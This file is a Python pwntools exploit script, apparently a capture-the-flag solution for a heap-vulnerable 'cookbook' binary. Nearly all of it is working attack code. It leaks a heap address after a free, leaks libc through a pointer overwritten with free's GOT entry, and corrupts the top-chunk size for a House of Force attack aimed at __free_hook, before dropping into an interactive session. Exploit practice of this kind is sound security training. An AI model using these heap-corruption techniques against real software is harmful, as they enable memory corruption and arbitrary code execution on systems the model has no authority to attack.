import ctypes
import pwn as p

# target = p.process('./cookbook', env={'LD_PRELOAD': './libc-2.27.so'})
target = p.process('./cookbook')
p.gdb.attach(target)

libc = p.ELF('./libc-2.23.so')
cookbook_elf = p.ELF('./cookbook')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


# methods to interact with cooking manager
def list_ingredients() -> None:
    prints(target.recvuntil(b'[q]uit'))
    target.sendline(b'l')


def list_recipes() -> None:
    prints(target.recvuntil(b'[q]uit'))
    target.sendline(b'r')


# send name
target.sendline(b'Samus')


# First leak
prints(target.recvuntil(b'[q]uit'))
target.sendline(b'c')   # create recipe option
target.recvuntil(b'[q]uit')
target.sendline(b'n')  # create new recipe

# add an ingredient to avoid consolidation
target.recvuntil(b'[q]uit')
target.sendline(b'a')  # add ingredient
target.recvuntil(b'which ingredient to add?')
target.sendline(b'water')
target.recvuntil(b'how many? (hex):')
target.sendline(b'12')

target.recvuntil(b'[q]uit')
target.sendline(b'd')  # free current recipe

target.recvuntil(b'[q]uit')
target.sendline(b'p')  # print recipe

# ignore lines before getting the interesting leak
target.recvline()
target.recvline()
target.recvline()
target.recvline()

# get the actual leak
line = target.recvline().replace(b'-', b'').strip()
heap_leak = int(line)
print('leak:', hex(heap_leak))


# second leak
target.recvuntil(b'[q]uit')
target.sendline(b'q')  # quit ^^

# create an ingredient
target.recvuntil(b'[q]uit')
target.sendline(b'a')  # add an ingredient
target.recvuntil(b'(doesn\'t quit)?')
target.sendline(b'n')  # create new ingredient
target.recvuntil(b'(doesn\'t quit)?')
target.sendline(b'g')  # give name to ingredient
target.sendline(b'name')
target.recvuntil(b'(doesn\'t quit)?')
target.sendline(b'p')  # give price to ingredient
target.sendline(b'66')
target.recvuntil(b'(doesn\'t quit)?')
target.sendline(b's')  # give calories to ingredient
target.sendline(b'1638')
target.recvuntil(b'(doesn\'t quit)?')
target.sendline(b'e')  # save
target.recvuntil(b'(doesn\'t quit)?')
target.sendline(b'q')  # quit ^^

# Overwrite address from recipe
prints(target.recvuntil(b'[q]uit'))
target.sendline(b'c')   # create recipe option
target.recvuntil(b'[q]uit')
target.sendline(b'i')  # write some instructions and overwrite size information
free_got = cookbook_elf.got['free']
target.sendline(b'0'*8 + p.p32(0x11) + p.p32(free_got)+p.p32(0x0))
target.recvuntil(b'[q]uit')
target.sendline(b'q')  # quit

target.recvuntil(b'[q]uit')
target.sendline(b'l')  # list ingredients

target.recvuntil(b'olive oil')
target.recvuntil(b'calories: ')
target.recvuntil(b'calories: ')
line = target.recvline().strip()
free_leak = ctypes.c_uint32(int(line)).value
print('free_leak:', hex(free_leak))

libc_base = free_leak - libc.symbols['free']
print('libc base:', hex(libc_base))


# House of force attack
free_hook = libc_base + libc.symbols['__free_hook']
print('we\'ll overwrite this free hook:', hex(free_hook))

# Overwrite top chunk
prints(target.recvuntil(b'[q]uit'))
target.sendline(b'c')   # create recipe option
target.recvuntil(b'[q]uit')
target.sendline(b'n')  # allocate a new chunk at the top
target.recvuntil(b'[q]uit')
target.sendline(b'i')  # write some instructions and overwrite size information
free_got = cookbook_elf.got['free']
target.sendline(b'0'*0x380+p.p32(0xffffffff)+p.p32(0x0))
target.recvuntil(b'[q]uit')
target.sendline(b'q')

malloc_to_freehook = free_hook - heap_leak
malloc_to_freehook //= 2
print('malloc_to_freehook:', hex(malloc_to_freehook))
# for i in range(0x100):
target.recvuntil(b'[q]uit')
target.sendline(b'g')  # give cookbook a name
target.sendline(b(hex(malloc_to_freehook)))
target.sendline(b'gogogol')

# free_hook = libc_base + libc.symbols['__free_hook']
# print('free hook:', hex(free_hook))

target.interactive()
